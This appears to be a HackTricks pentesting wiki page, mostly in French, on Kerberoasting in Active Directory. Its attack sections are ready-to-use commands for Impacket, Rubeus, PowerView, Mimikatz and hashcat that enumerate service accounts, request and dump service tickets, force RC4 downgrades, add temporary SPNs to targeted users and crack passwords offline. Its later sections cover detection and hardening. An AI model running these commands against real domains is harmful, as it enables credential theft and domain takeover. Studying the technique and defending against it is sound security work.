# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se concentre sur l'acquisition de tickets TGS, spécifiquement ceux liés aux services s'exécutant sous des comptes utilisateur dans Active Directory (AD), à l'exclusion des comptes ordinateurs. Le chiffrement de ces tickets utilise des clés dérivées des mots de passe utilisateurs, permettant un craquage des identifiants hors ligne. L'utilisation d'un compte utilisateur comme service est indiquée par une propriété ServicePrincipalName (SPN) non vide.

Tout utilisateur de domaine authentifié peut demander des tickets TGS, donc aucun privilège spécial n'est nécessaire.

### Key Points

- Cible les tickets TGS pour des services qui tournent sous des comptes utilisateur (c.-à-d. comptes avec SPN défini ; pas les computer accounts).
- Les tickets sont chiffrés avec une clé dérivée du mot de passe du service et peuvent être craqués hors ligne.
- Aucun privilège élevé requis ; tout compte authentifié peut demander des tickets TGS.

> [!WARNING]
> Most public tools prefer requesting RC4-HMAC (etype 23) service tickets because they’re faster to crack than AES. RC4 TGS hashes start with `$krb5tgs$23$*`, AES128 with `$krb5tgs$17$*`, and AES256 with `$krb5tgs$18$*`. However, many environments are moving to AES-only. Do not assume only RC4 is relevant.
> Also, avoid “spray-and-pray” roasting. Rubeus’ default kerberoast can query and request tickets for all SPNs and is noisy. Enumerate and target interesting principals first.

### Service account secrets & Kerberos crypto cost

Beaucoup de services tournent encore sous des comptes utilisateur avec des mots de passe gérés manuellement. Le KDC chiffre les tickets de service avec des clés dérivées de ces mots de passe et fournit le ciphertext à n'importe quel principal authentifié, donc le kerberoasting permet un nombre illimité d'essais hors ligne sans lockouts ni télémétrie DC. Le mode de chiffrement détermine le budget de craquage :

| Mode | Key derivation | Encryption type | Débit approximatif RTX 5090* | Remarques |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 with 4,096 iterations and a per-principal salt generated from the domain + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 million guesses/s | Le sel empêche l'usage de rainbow tables mais permet malgré tout un craquage rapide des mots de passe courts. |
| RC4 + NT hash | Single MD4 of the password (unsalted NT hash); Kerberos only mixes in an 8-byte confounder per ticket | etype 23 (`$krb5tgs$23$`) | ~4.18 **milliards** guesses/s | ~1000× plus rapide que AES ; les attaquants forcent RC4 chaque fois que `msDS-SupportedEncryptionTypes` le permet. |

*Benchmarks from Chick3nman as d in [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

Le confounder de RC4 ne randomise que le keystream ; il n'ajoute pas de travail par tentative. Sauf si les comptes de service reposent sur des secrets aléatoires (gMSA/dMSA, machine accounts, or vault-managed strings), la vitesse de compromission dépend uniquement du budget GPU. Imposer des etypes AES-only supprime la dégradation aux milliards de tentatives par seconde, mais des mots de passe humains faibles tombent toujours face à PBKDF2.

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Outils multifonctions incluant des vérifications kerberoast :
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Énumérer les utilisateurs kerberoastable
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1 : Demander un TGS et dump de la mémoire
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: Outils automatiques
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Une requête TGS génère Windows Security Event 4769 (Un ticket de service Kerberos a été demandé).

### OPSEC and AES-only environments

- Demander RC4 intentionnellement pour les comptes sans AES :
- Rubeus: `/rc4opsec` utilise tgtdeleg pour énumérer les comptes sans AES et demande des tickets de service RC4.
- Rubeus: `/tgtdeleg` with kerberoast déclenche également des requêtes RC4 lorsque possible.
- Roast des comptes AES-only au lieu d'échouer silencieusement :
- Rubeus: `/aes` énumère les comptes avec AES activé et demande des tickets de service AES (etype 17/18).
- Si vous possédez déjà un TGT (PTT ou depuis un .kirbi), vous pouvez utiliser `/ticket:<blob|path>` avec `/spn:<SPN>` ou `/spns:<file>` et éviter LDAP.
- Ciblage, throttling et réduction du bruit :
- Utilisez `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` et `/jitter:<1-100>`.
- Filtrer pour des mots de passe probablement faibles en utilisant `/pwdsetbefore:<MM-dd-yyyy>` (mots de passe plus anciens) ou cibler des OUs privilégiées avec `/ou:<DN>`.

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistance / Abus

Si vous contrôlez ou pouvez modifier un compte, vous pouvez le rendre kerberoastable en ajoutant un SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Rétrograder un compte pour activer RC4 et faciliter le cracking (nécessite des privilèges d'écriture sur l'objet cible) :
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll sur un utilisateur (SPN temporaire)

Lorsque BloodHound indique que vous contrôlez un objet utilisateur (p. ex., GenericWrite/GenericAll), vous pouvez de manière fiable “targeted-roast” cet utilisateur spécifique même s'il n'a actuellement aucun SPN :

- Ajoutez un SPN temporaire à l'utilisateur contrôlé pour le rendre roastable.
- Demandez un TGS-REP chiffré avec RC4 (etype 23) pour ce SPN afin de favoriser le cracking.
- Crack the `$krb5tgs$23$...` hash with hashcat.
- Nettoyez le SPN pour réduire l'empreinte.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
One-liner Linux (targetedKerberoast.py automatise l'ajout d'un SPN -> la requête TGS (etype 23) -> la suppression du SPN) :
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Crack la sortie avec hashcat autodetect (mode 13100 pour `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Notes de détection : l'ajout/suppression de SPN provoque des modifications de l'annuaire (Event ID 5136/4738 sur l'utilisateur ciblé) et la requête TGS génère l'Event ID 4769. Envisagez une limitation (throttling) et un nettoyage rapide.

Vous pouvez trouver des outils utiles pour les attaques kerberoast ici : https://github.com/nidem/kerberoast

Si vous rencontrez cette erreur depuis Linux : `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` , c'est dû à un décalage horaire local. Synchronisez l'horloge avec le DC :

- `ntpdate <DC_IP>` (obsolète sur certaines distributions)
- `rdate -n <DC_IP>`

### Kerberoast sans compte de domaine (AS-requested STs)

En septembre 2022, Charlie Clark a montré que si un principal ne nécessite pas de pré-authentification, il est possible d'obtenir un service ticket via un KRB_AS_REQ forgé en modifiant le sname dans le corps de la requête, obtenant ainsi un service ticket au lieu d'un TGT. Cela reflète l'AS-REP roasting et ne nécessite pas d'identifiants de domaine valides.

Voir les détails : write-up de Semperis « New Attack Paths: AS-requested STs ».

> [!WARNING]
> Vous devez fournir une liste d'utilisateurs car sans identifiants valides vous ne pouvez pas interroger LDAP avec cette technique.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Articles connexes

Si vous ciblez des utilisateurs AS-REP roastable, voir aussi :

{{#ref}}
asreproast.md
{{#endref}}

### Détection

Kerberoasting peut être discret. Recherchez l'Event ID 4769 depuis les DCs et appliquez des filtres pour réduire le bruit :

- Exclure le nom de service `krbtgt` et les noms de service se terminant par `$` (comptes ordinateurs).
- Exclure les requêtes provenant de comptes machine (`*$$@*`).
- Uniquement les requêtes réussies (Failure Code `0x0`).
- Suivre les types de chiffrement : RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Ne pas alerter uniquement sur `0x17`.

Exemple de triage PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Idées supplémentaires :

- Établir une ligne de base de l'utilisation normale des SPN par hôte/utilisateur ; alerter sur de fortes rafales de requêtes SPN distinctes provenant d'un même principal.
- Signaler toute utilisation inhabituelle de RC4 dans des domaines durcis AES.

### Atténuation / Durcissement

- Utilisez gMSA/dMSA ou des comptes machine pour les services. Les comptes gérés ont des mots de passe aléatoires de 120+ caractères et tournent automatiquement, rendant le cracking hors ligne impraticable.
- Appliquez AES aux comptes de service en définissant `msDS-SupportedEncryptionTypes` sur AES-only (decimal 24 / hex 0x18) puis en faisant tourner le mot de passe afin que les clés AES soient dérivées.
- Lorsque possible, désactivez RC4 dans votre environnement et surveillez les tentatives d'utilisation de RC4. Sur les DCs vous pouvez utiliser la valeur de registre `DefaultDomainSupportedEncTypes` pour orienter les valeurs par défaut pour les comptes sans `msDS-SupportedEncryptionTypes` défini. Testez soigneusement.
- Supprimez les SPN inutiles des comptes utilisateur.
- Utilisez des mots de passe longs et aléatoires pour les comptes de service (25+ chars) si les comptes gérés ne sont pas possibles ; interdisez les mots de passe courants et auditez régulièrement.

## References

- [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
